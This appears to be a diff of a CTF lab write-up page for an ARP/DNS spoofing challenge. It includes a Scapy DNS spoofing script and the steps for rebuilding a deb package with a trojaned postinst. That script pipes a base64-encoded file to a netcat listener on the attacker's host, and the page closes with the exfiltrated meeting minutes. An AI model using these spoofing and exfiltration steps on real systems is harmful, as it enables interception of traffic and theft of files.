@@ -103,6 +103,16 @@
     </li>
         </ul>
     </li>
+    <li class="toctree-l2"><a class="reference internal" href="#verify-incoming-traffic">Verify incoming traffic</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#building-malicious-deb-package">Building malicious deb package</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#setup-the-exfiltration-listener">Setup the exfiltration listener</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#serving-the-malicious-payload">Serving the malicious payload</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#exfiltrated-file">Exfiltrated file</a>
+    </li>
     </ul>
                     </li>
                 </ul>
@@ -123,6 +133,10 @@
                     </li>
                 </ul>
                 <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
+                    </li>
+                </ul>
+                <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Elf-Code/A-Elf-Code/">Achivement ElfCode</a>
                     </li>
                 </ul>
@@ -132,10 +146,6 @@
                 </ul>
                 <ul>
                     <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Redis/A-Redis/">Achivement Redis</a>
-                    </li>
-                </ul>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../../../achivements/A-Kringle-kiosk/A-Kringle-kiosk/">Achivement Kiosk</a>
                     </li>
                 </ul>
                 <ul>
@@ -222,7 +232,7 @@ sure to copy off any essential work you have done as you go.</p>
 <p>IP address: 10.6.0.2
 MAC address: 02:42:0a:06:00:02</p>
 <h2 id="arp-poisoning">ARP poisoning</h2>
-<p>To start we run tcpdump to check what ip is sedning the ARP requests.</p>
+<p>To start we run tcpdump to check what ip is sending the ARP requests.</p>
 <pre><code>guest@29847c69ad6a:~$ tcpdump -n 
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
@@ -262,10 +272,10 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:16:15.618236 ARP, Reply 10.6.6.53 is-at 02:42:0a:06:00:02, length 28
 04:16:15.646731 IP 10.6.6.35.22953 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
 </code></pre>
-<p>Now we modify the DNS poisoning script with the information we already know so it respond to all DNS requests giving our own machin IP and MAC addresses as destination.</p>
+<p>Now we modify the DNS poisoning script with the information we already know so it responds to all DNS requests giving our own machine IP and MAC addresses as destination.</p>
 <p><a href="../dns.py">DNS script</a></p>
 <h3 id="modified-values-for-dns-poisoning">Modified values for DNS poisoning</h3>
-<p>```ipaddr_we_arp_spoofed = "10.6.6.53"
+<pre><code>ipaddr_we_arp_spoofed = &quot;10.6.6.53&quot;
 def handle_dns_request(packet):
     # Need to change mac addresses, Ip Addresses, and ports below.
     # We also need
@@ -274,7 +284,7 @@ def handle_dns_request(packet):
     dstmac=packet[Ether].src
     srcmac=packet[Ether].dst
     eth = Ether(src=srcmac, dst=dstmac)   # need to replace mac addresses
-    ip  = IP(dst="10.6.6.35", src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
+    ip  = IP(dst=&quot;10.6.6.35&quot;, src=ipaddr_we_arp_spoofed)             # need to replace IP addresses
     udp = UDP(dport=dstport, sport=srcport)                             # need to replace ports
     dns = DNS(
         # MISSING DNS RESPONSE LAYER VALUES
@@ -283,14 +293,14 @@ def handle_dns_request(packet):
         qdcount=1, ancount=1, nscount=0, arcount=0, 
         qd=DNSQR(qname=packet[DNS].qd.qname, qtype='A', qclass=1),
         an=DNSRR(rrname=packet[DNS].qd.qname, type='A', rclass=1,
-        ttl=600, rdata="10.6.0.2")
+        ttl=600, rdata=&quot;10.6.0.2&quot;)
     )
     dns_response = eth / ip / udp / dns
-    sendp(dns_response, iface="eth0")</p>
-<pre><code>## Verify incoming traffic
-Now we run the DNS poisoning script in another pane and verify that both the ARP and the DNS poisoning attacks are working.
+    sendp(dns_response, iface=&quot;eth0&quot;)
 </code></pre>
-<p>guest@29847c69ad6a:~$ tcpdump -n src host 10.6.6.35
+<h2 id="verify-incoming-traffic">Verify incoming traffic</h2>
+<p>Now we run the DNS poisoning script in another pane and verify that both the ARP and the DNS poisoning attacks are working.</p>
+<pre><code>guest@29847c69ad6a:~$ tcpdump -n src host 10.6.6.35
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:32:19.882406 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
@@ -303,21 +313,18 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 04:32:20.489449 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [FP.], seq 2024:2244, ack 810, win 505, options [nop,nop,TS val 626668890 ecr 2887327831], length 220
 04:32:20.490952 IP 10.6.6.35.64352 &gt; 10.6.0.2.42932: Flags [.], ack 811, win 505, options [nop,nop,TS val 626668891 ecr 2887327836], length 0
 04:32:20.522762 IP 10.6.6.35.49790 &gt; 10.6.6.53.53: 0+ A? ftp.osuosl.org. (32)
-04:32:20.934339 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28</p>
-<pre><code>
-The machine is now receiving request from the poisoned machine on port 80, to verify the type of requests the machine receives we use `python3` `http.server` module.
+04:32:20.934339 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
 </code></pre>
-<p>uest@29847c69ad6a:~$ python3 -m http.server 80
+<p>The machine is now receiving request from the poisoned machine on port 80, to verify the type of requests the machine receives we use <code>python3</code> <code>http.server</code> module.</p>
+<pre><code>uest@29847c69ad6a:~$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.6.6.35 - - [21/Dec/2020 04:34:47] code 404, message File not found
-10.6.6.35 - - [21/Dec/2020 04:34:47] "GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1" 404 -</p>
-<pre><code>
-The server receives requests for a debian package `/pub/jfrost/backdoor/suriv_amd64.deb`, so we can use that to deliver a malicious package and retrieve the flag.
-
-## Building malicious deb pakcage
-We reuse one fo teh packages already present on the machine to build our malicious payload.
+10.6.6.35 - - [21/Dec/2020 04:34:47] &quot;GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1&quot; 404 -
 </code></pre>
-<p>cd debs
+<p>The server receives requests for a debian package <code>/pub/jfrost/backdoor/suriv_amd64.deb</code>, so we can use that to deliver a malicious package and retrieve the flag.</p>
+<h2 id="building-malicious-deb-package">Building malicious deb package</h2>
+<p>We reuse one of the packages already present on the machine to build our malicious payload.</p>
+<pre><code>cd debs
 dpkg -x nano_4.8-1ubuntu1_amd64.deb work
 mkdir work/DEBIAN
 ar -x nano_4.8-1ubuntu1_amd64.deb
@@ -325,47 +332,51 @@ xz -d -v control.tar.xz
 tar -xvf control.tar ./control
 tar -xvf control.tar ./postinst
 mv control work/DEBIAN/
-mv postinst work/DEBIAN/</p>
-<pre><code>We modify the post installation script to exfiltrate the contents of the file we want and we set our machine to listen on the port we specify on the script.
+mv postinst work/DEBIAN/
 </code></pre>
-<p>work/DEBIAN/postinst  contents 
----START---</p>
-<h1 id="binsh">!/bin/sh</h1>
-<p>if [ "$1" = "configure" ] || [ "$1" = "abort-upgrade" ]; then
+<p>We modify the post installation script to exfiltrate the contents of the file we want and we set our machine to listen on the port we specify on the script.</p>
+<pre><code>work/DEBIAN/postinst  contents 
+---START---
+#!/bin/sh
+
+if [ &quot;$1&quot; = &quot;configure&quot; ] || [ &quot;$1&quot; = &quot;abort-upgrade&quot; ]; then
             update-alternatives --install /usr/bin/editor editor /bin/nano 40 \
                           --slave /usr/share/man/man1/editor.1.gz editor.1.gz \
                                 /usr/share/man/man1/nano.1.gz
                 update-alternatives --install /usr/bin/pico pico /bin/nano 10 \
                               --slave /usr/share/man/man1/pico.1.gz pico.1.gz \
                                     /usr/share/man/man1/nano.1.gz
-fi</p>
-<p>echo "<code>cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt |base64</code>" |nc 10.6.0.2 8000
----END---</p>
-<pre><code>We finish building the package and create the correct directory structure to match the incoming requests
+fi
+
+echo &quot;`cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt |base64`&quot; |nc 10.6.0.2 8000
+---END---
 </code></pre>
-<p>dpkg-deb --build work/
+<p>We finish building the package and create the correct directory structure to match the incoming requests</p>
+<pre><code>dpkg-deb --build work/
 mkdir -p pub/jfrost/backdoor
-mv work.deb pub/jfrost/backdoor/suriv_amd64.deb</p>
-<pre><code>
-## Setup the exfiltration listener
-We set `nc` to listen in port `8000` as we configured our payload and perform the decoding in another `tmux` pane.
+mv work.deb pub/jfrost/backdoor/suriv_amd64.deb
 </code></pre>
-<p>nc -lvp 8000 |base64 -d |tee -a NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</p>
-<pre><code>
-## Serving the malicious payload
-We set `python` `http.server` module to listen on port `80` and serve the file.
+<h2 id="setup-the-exfiltration-listener">Setup the exfiltration listener</h2>
+<p>We set <code>nc</code> to listen in port <code>8000</code> as we configured our payload and perform the decoding in another <code>tmux</code> pane.</p>
+<pre><code>nc -lvp 8000 |base64 -d |tee -a NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
 </code></pre>
-<p>python3 -m http.server 80</p>
-<pre><code>
-## Exfiltrated file
+<h2 id="serving-the-malicious-payload">Serving the malicious payload</h2>
+<p>We set <code>python</code> <code>http.server</code> module to listen on port <code>80</code> and serve the file.</p>
+<pre><code>python3 -m http.server 80
+
 </code></pre>
-<p>January 20, 2020</p>
-<p>Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole</p>
-<p>Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.</p>
-<p>Roll call of Board members please:
+<h2 id="exfiltrated-file">Exfiltrated file</h2>
+<pre><code>January 20, 2020
+
+Meeting Location: All gathered in North Pole Municipal Building, 1 Santa Claus Ln, North Pole
+
+Chairman Frost calls meeting to order at 7:30 PM North Pole Standard Time.
+
+Roll call of Board members please:
 Chairman Jack Frost - Present
-Vice Chairman Mother Nature - Present</p>
-<p>Superman - Present
+Vice Chairman Mother Nature - Present
+
+Superman - Present
 Clarice - Present
 Yukon Cornelius - HERE!
 Ginger Breaddie - Present
@@ -377,18 +388,24 @@ Krampus - Growl
 Dolly - Present
 Snow Miser - Heya!
 Alabaster Snowball - Hello
-Queen of the Winter Spirits - Present</p>
-<p>ALSO PRESENT:
+Queen of the Winter Spirits - Present
+
+ALSO PRESENT:
                 Kris Kringle
                 Pepper Minstix
                 Heat Miser
-                Father Time</p>
-<p>Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.</p>
-<p>Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.</p>
-<p>OLD BUSINESS: No Old Business.</p>
-<p>RESOLUTIONS:
-The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  </p>
-<p>Approved:
+                Father Time
+
+Chairman Frost made the required announcement concerning the Open Public Meetings Act: Adequate notice of this meeting has been made -- displayed on the bulletin board next to the Pole, listed on the North Pole community website, and published in the North Pole Times newspaper -- for people who are interested in this meeting.
+
+Review minutes for December 2020 meeting. Motion to accept – Mrs. Donner. Second – Superman.  Minutes approved.
+
+OLD BUSINESS: No Old Business.
+
+RESOLUTIONS:
+The board took up final discussions of the plans presented last year for the expansion of Santa’s Castle to include new courtyard, additional floors, elevator, roughly tripling the size of the current castle.  Architect Ms. Pepper reviewed the planned changes and engineering reports. Chairman Frost noted, “These changes will put a heavy toll on the infrastructure of the North Pole.”  Mr. Krampus replied, “The infrastructure has already been expanded to handle it quite easily.”  Chairman Frost then noted, “But the additional traffic will be a burden on local residents.”  Dolly explained traffic projections were all in alignment with existing roadways.  Chairman Frost then exclaimed, “But with all the attention focused on Santa and his castle, how will people ever come to refer to the North Pole as ‘The Frostiest Place on Earth?’”  Mr. In-the-Box pointed out that new tourist-friendly taglines are always under consideration by the North Pole Chamber of Commerce, and are not a matter for this Board.  Mrs. Nature made a motion to approve.  Seconded by Mr. Cornelius.  Tanta Kringle recused herself from the vote given her adoption of Kris Kringle as a son early in his life.  
+
+Approved:
 Mother Nature
 Superman
 Clarice
@@ -401,12 +418,15 @@ Krampus
 Dolly
 Snow Miser
 Alabaster Snowball
-Queen of the Winter Spirits</p>
-<p>Opposed: 
-                Jack Frost</p>
-<p>Resolution carries.  Construction approved.</p>
-<p>NEW BUSINESS:
-```</p>
+Queen of the Winter Spirits
+
+Opposed: 
+                Jack Frost
+
+Resolution carries.  Construction approved.
+
+NEW BUSINESS:
+</code></pre>
 <p>ANSWER: Tanta Kringle</p>
               
             </div>
